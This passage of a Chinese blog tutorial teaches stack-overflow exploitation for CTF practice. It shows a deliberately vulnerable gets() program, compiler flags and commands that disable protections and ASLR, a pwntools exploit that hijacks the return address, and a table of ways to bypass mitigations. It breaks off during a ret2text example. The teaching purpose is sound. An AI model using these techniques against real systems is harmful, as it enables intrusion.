@@ -1,0 +1,1715 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="栈溢出前置基础(更新中), 皮皮先生">
+    <meta name="description" content="栈溢出基础学习">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>栈溢出前置基础(更新中) | 皮皮先生</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+
+<link rel="stylesheet" type="text/css" href="/css/blog-pet.css">
+
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">皮皮先生</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">皮皮先生</div>
+        <div class="logo-desc">
+            
+            不进则退 努力努力再努力
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">栈溢出前置基础(更新中)</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/PWN/">
+                                <span class="chip bg-color">PWN</span>
+                            </a>
+                        
+                            <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">二进制安全</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" class="post-category">
+                                二进制安全
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2026-10-23
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h1><h2 id="栈是什么"><a href="#栈是什么" class="headerlink" title="栈是什么"></a>栈是什么</h2><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/</a></p>
+<p>栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，如下图所示（维基百科）。两种操作都操作栈顶，当然，它也有栈底。</p>
+<p>高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong>。</p>
+<p><strong>形象理解</strong></p>
+<p>栈(stack) 是一块按照 “后进先出” 规则管理的连续内存空间，专门用来存放函数的<strong>局部变量、参数、返回地址</strong>。</p>
+<p>你可以把它想象成一摞盘子：</p>
+<ul>
+<li>调用一个函数，就往上面放一个盘子（<strong>压栈</strong>）</li>
+<li>函数执行完，就把盘子拿走（<strong>出栈</strong>）</li>
+<li>最后放的，最先拿走（<strong>后进先出</strong>）</li>
+</ul>
+<p>每个”盘子”就是一个<strong>栈帧（Stack Frame）</strong>，对应一次函数调用。</p>
+<p><strong>栈是”从高地址往低地址”生长的。</strong></p>
+<p>高地址  ← 栈底（先入的）<br>┌─────────────────┐<br>│   调用者的数据    				 │<br>├─────────────────┤<br>│   函数参数        					 │<br>├─────────────────┤<br>│   返回地址 ★      				   │<br>├─────────────────┤<br>│   保存的 ebp      				   │ &lt;– 栈帧基址 定位当前函数栈帧<br>├─────────────────┤<br>│   局部变量 buf    				 │  ← 你在代码里声明的 char buf[64]<br>├─────────────────┤<br>│   …            							 │<br>└─────────────────┘<br>低地址  ← 栈顶（后入的，esp 指向这里）栈指针 指向栈顶</p>
+<p>视频推荐 b站up主  <a target="_blank" rel="noopener" href="https://space.bilibili.com/269749034/?spm_id_from=333.788.upinfo.detail.click">IGBeginner0116       </a>  其中的 《过程与栈-函数调用如何在内存中发生》</p>
+<p>ebp&#x2F;rbp 栈帧基址         –&gt;  指向当前函数栈帧的底部（基址）</p>
+<p>esp&#x2F;rsp 栈指针              –&gt; 指向栈顶</p>
+<p>eip&#x2F;rip&#x2F;pc 程序计数器    –&gt; 指向下一条要执行的指令地址</p>
+<h2 id="栈溢出如何产生"><a href="#栈溢出如何产生" class="headerlink" title="栈溢出如何产生"></a>栈溢出如何产生</h2><p>当输入的数据超过了分配的内存边界，把相邻的返回地址覆盖了，从而在函数返回时劫持了程序的执行流。利用的本质就是精确控制这个返回地址，让它跳到攻击者想要的地方。</p>
+<h2 id="示例讲解"><a href="#示例讲解" class="headerlink" title="示例讲解"></a>示例讲解</h2><p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址所在的段具有可执行权限</strong>。下面，我们举一个简单的例子：</p>
+<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void success(void)
+&#123;
+    puts(&quot;You Hava already controlled it.&quot;);
+&#125;
+
+void vulnerable(void)
+&#123;
+    char s[12];
+    gets(s);
+    puts(s);
+    return;
+&#125;
+
+int main(int argc, char **argv)
+&#123;
+    vulnerable();
+    return 0;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这个程序的主要目的读取一个字符串，并将其输出。<strong>我们希望可以控制程序执行 success 函数。</strong></p>
+<p>我们利用如下命令对其进行编译</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> <span class="token comment">#32位</span>
+<span class="token function">sudo</span> <span class="token function">apt</span> update
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> gcc-multilib libc6-dev-i386
+ gcc <span class="token parameter variable">-m32</span> <span class="token parameter variable">-o</span> vuln vuln.c <span class="token punctuation">\</span>
+         -fno-stack-protector <span class="token punctuation">\</span>  <span class="token comment"># 关闭 Stack Canary（栈金丝雀）</span>
+         -no-pie <span class="token punctuation">\</span>               <span class="token comment"># 关闭 PIE（地址无关可执行），代码地址固定</span>
+         <span class="token parameter variable">-z</span> execstack            <span class="token comment"># 关闭 NX（栈可执行，可以跑 shellcode)</span>
+    
+    
+  <span class="token comment">#64位</span>
+  gcc <span class="token parameter variable">-o</span> vuln vuln.c <span class="token punctuation">\</span>
+         -fno-stack-protector <span class="token punctuation">\</span>
+         -no-pie <span class="token punctuation">\</span>
+         <span class="token parameter variable">-z</span> execstack
+         <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">gcc -m32 -fno-pie -no-pie -fno-stack-protector -z execstack -o stack_example stack_example.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2026/10/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/image-20261021195402370.png"></p>
+<p>可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出，</p>
+<blockquote>
+<p>历史上，<strong>莫里斯蠕虫</strong>第一种蠕虫病毒就利用了 gets 这个危险函数实现了栈溢出。</p>
+</blockquote>
+<p>gcc 编译指令中，<code>-m32</code> 指的是生成 32 位程序； <code>-fno-stack-protector</code> 指的是不开启堆栈溢出保护，即不生成 canary。 此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position  Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令<code>gcc -v</code>查看 gcc 默认的开关情况。如果含有<code>--enable-default-pie</code>参数则代表 PIE 默认已开启，需要在编译指令中添加参数<code>-no-pie</code>。</p>
+<p>编译成功后，可以使用 checksec 工具检查编译出的文件：</p>
+<p><img src="/2026/10/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/image-20261021212913545.png"></p>
+<p>提到编译时的 PIE 保护，Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE  保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE  时基址不同）。我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code> 来控制 ASLR 启动与否，具体的选项有</p>
+<ul>
+<li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li>
+<li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li>
+<li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li>
+</ul>
+<p>我们可以使用 <code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code> 关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p>
+<p>为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。当然读者也可以尝试 ASLR、PIE 开关的不同组合，配合 IDA 及其动态调试功能观察程序地址变化情况（在 ASLR 关闭、PIE 开启时也可以攻击成功）。</p>
+<p>确认栈溢出和 PIE 保护关闭后，我们利用 IDA 来反编译一下二进制程序并查看 vulnerable 函数 。可以看到</p>
+<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int vulnerable()
+&#123;
+  char s[20]; &#x2F;&#x2F; [esp+4h] [ebp-14h] BYREF
+
+  gets(s);
+  return puts(s);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p>
+<pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">             +-----------------+
+             |     retaddr     |
+             +-----------------+
+             |     saved ebp   |
+      ebp---&gt;+-----------------+
+             |                 |
+             |                 |
+             |                 |
+             |                 |
+             |                 |
+             |                 |
+s,ebp-0x14--&gt;+-----------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x0000119D。</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"> text<span class="token operator">:</span><span class="token number">08049176</span> <span class="token punctuation">;</span> <span class="token keyword">int</span> <span class="token function">success</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08049176</span>                 public success
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08049176</span> success         proc near
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08049176</span> <span class="token punctuation">;</span> __unwind <span class="token punctuation">&#123;</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08049176</span>                 push    ebp
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08049177</span>                 mov     ebp<span class="token punctuation">,</span> esp
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08049179</span>                 sub     esp<span class="token punctuation">,</span> <span class="token number">8</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0804917</span>C                 sub     esp<span class="token punctuation">,</span> <span class="token number">0</span>Ch
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0804917F</span>                 push    offset s        <span class="token punctuation">;</span> <span class="token string">"You Hava already controlled it."</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08049184</span>                 call    _puts
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08049189</span>                 add     esp<span class="token punctuation">,</span> <span class="token number">10</span>h
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0804918</span>C                 nop
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0804918</span>D                 leave
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0804918</span>E                 retn
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0804918</span>E <span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// starts at 8049176</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0804918</span>E success         endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>那么如果我们读取的字符串为</p>
+<pre class="line-numbers language-none"><code class="language-none">0x14*&#39;a&#39;+&#39;bbbb&#39;+success_addr &#x2F;&#x2F;由于这是32位程序所以覆盖ebp只需要4个字节即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p>
+<pre class="line-numbers language-none"><code class="language-none">             +-----------------+
+             |    0x0804843B   | &lt;-- 这里换我们想要劫持的地址
+             +-----------------+
+             |       bbbb      | &lt;-- 这里任意4字节填充
+      ebp---&gt;+-----------------+
+             |                 |
+             |                 |
+             |                 | &lt;--这里就是我们填充的0x14个字节
+             |                 |
+             |                 |
+             |                 |
+s,ebp-0x14--&gt;+-----------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>那么简单编写个exp进行尝试跳转</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./stack_example'</span><span class="token punctuation">)</span>
+success_addr <span class="token operator">=</span> <span class="token number">0x08049176</span>
+payload <span class="token operator">=</span> <span class="token string">b"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x14</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>success_addr<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2026/10/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/image-20261021213512603.png"></p>
+<p>成功劫持</p>
+<h2 id="五大保护机制"><a href="#五大保护机制" class="headerlink" title="五大保护机制"></a>五大保护机制</h2><table>
+<thead>
+<tr>
+<th>保护</th>
+<th>作用</th>
+<th>绕过手法</th>
+<th>关键细节</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>NX (DEP)</strong></td>
+<td>栈&#x2F;堆不可执行</td>
+<td>ROP &#x2F; ret2libc &#x2F; ret2mprotect</td>
+<td>不写 shellcode，复用现有代码；或调 mprotect 把栈改回可执行再跳 shellcode</td>
+</tr>
+<tr>
+<td><strong>Canary</strong></td>
+<td>返回地址前放随机 cookie，被改则 crash</td>
+<td>① 泄露回填 ② fork 逐字节爆破 ③ 绕过检测点</td>
+<td>① 格式化字符串 %p 读出后原样填回；② fork 服务子进程 canary 不变，每次猜 1 字节（最多 256×8 次）；③ 不碰返回地址，改局部指针变量间接控制流程</td>
+</tr>
+<tr>
+<td><strong>ASLR</strong></td>
+<td>libc&#x2F;栈&#x2F;堆基址随机（系统级属性）</td>
+<td>① info leak ② partial overwrite ③ 爆破（32位熵低）</td>
+<td>系统开关：&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space，0&#x3D;关闭（IoT 设备常为 0）</td>
+</tr>
+<tr>
+<td><strong>PIE</strong></td>
+<td>程序自身代码&#x2F;数据基址随机（编译属性）</td>
+<td>① 泄露 .text 基址 ② partial overwrite</td>
+<td>ASLR 是系统属性，PIE 是编译选项；不开 PIE 的程序 ASLR 开着代码段也固定</td>
+</tr>
+<tr>
+<td><strong>RELRO</strong></td>
+<td>GOT 表只读化</td>
+<td>Partial → GOT 劫持；Full → 绕开 GOT</td>
+<td>Partial 的 .got.plt 仍可写；Full 改写 __free_hook &#x2F; fini_array &#x2F; 函数指针，或直接 ROP</td>
+</tr>
+</tbody></table>
+<p>补充：<strong>Fortify</strong>（编译期把 strcpy 换成 __strcpy_chk）只挡编译期已知大小的拷贝，审计时看到 <code>__xxx_chk</code> 函数就换溢出点。</p>
+<p>partial overwrite 原理：ASLR&#x2F;PIE 按页随机（页对齐），地址低 12 位不变，只覆盖低位 1~2 字节即可在不知基址时跳到附近函数。</p>
+<h1 id="基本-ROP"><a href="#基本-ROP" class="headerlink" title="基本 ROP"></a>基本 ROP</h1><p>随着 NX (Non-eXecutable) 保护的开启，传统的直接向栈或者堆上直接注入代码的方式难以继续发挥效果，由此攻击者们也提出来相应的方法来绕过保护。</p>
+<p>目前被广泛使用的攻击手法是 <strong>返回导向编程</strong> (Return Oriented Programming)，其主要思想是在 <strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong> </p>
+<p>gadgets 通常是以 <code>ret</code> 结尾的指令序列，通过这样的指令序列，我们可以多次劫持程序控制流，从而运行特定的指令序列，以完成攻击的目的。</p>
+<p>返回导向编程这一名称的由来是因为其核心在于利用了指令集中的 ret 指令，从而改变了指令流的执行顺序，并通过数条 gadget “执行” 了一个新的程序。</p>
+<p>使用 ROP 攻击一般得满足如下条件：</p>
+<ul>
+<li>程序漏洞允许我们劫持控制流，并控制后续的返回地址。</li>
+<li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li>
+</ul>
+<p>作为一项基本的攻击手段，ROP 攻击并不局限于栈溢出漏洞，也被广泛应用在堆溢出等各类漏洞的利用当中。</p>
+<p>需要注意的是，现代操作系统通常会开启地址随机化保护（ASLR），这意味着 gadgets 在内存中的位置往往是不固定的。但幸运的是其相对于对应段基址的偏移通常是固定的，因此我们在寻找到了合适的 gadgets  之后可以通过其他方式泄漏程序运行环境信息，从而计算出 gadgets 在内存中的真正地址。</p>
+<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>关闭地址随机化ASLR</p>
+<p>临时关闭（重启失效）</p>
+<p> echo 0 | sudo tee &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</p>
+<p>恢复</p>
+<p> echo 2 | sudo tee &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>ret2text 即控制程序执行程序本身已有的的代码 (即， <code>.text</code> 段中的代码) 。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
+<p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
+<h3 id="编译例子"><a href="#编译例子" class="headerlink" title="编译例子"></a>编译例子</h3><p>其实，在栈溢出的基本原理中，我们已经介绍了这一简单的攻击。在这里，我们再给出另外一个例子，bamboofox 中介绍 ROP 时使用的 ret2text 的例子。</p>
+<blockquote>
+<p>点击下载: <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p>
+</blockquote>
+<p>首先，查看一下程序的保护机制：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">🐑🍻🐆➜  ret2text checksec ret2text 
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/pipi/Desktop/stack_pwn/ret2text/ret2text'</span>
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
+    Stripped:   No
+    Debuginfo:  Yes
+🐑🍻🐆➜  ret2text <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看出程序是 32 位程序，且仅开启了栈不可执行保护。接下来我们使用 IDA 反编译该程序：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-64h] BYREF</span>
+
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"There is something amazing here, do you know anything?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">gets</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Maybe I will tell you next time !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里我们进入main函数看发现程序先是进行输出一段内容然后再通过危险函数gets进行无限制输入,这里输入的s数组起始距离ebp是0x64h</p>
+<p>我们观察在IDA中字符串查找shift+F12 发现有&#x2F;bin&#x2F;sh 字符串，那么跟进发现后门函数 </p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">secure</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token class-name">time_t</span> v0<span class="token punctuation">;</span> <span class="token comment">// eax</span>
+  <span class="token keyword">int</span> input<span class="token punctuation">;</span> <span class="token comment">// [esp+18h] [ebp-10h] BYREF</span>
+  <span class="token keyword">int</span> secretcode<span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-Ch]</span>
+
+  v0 <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">srand</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  secretcode <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
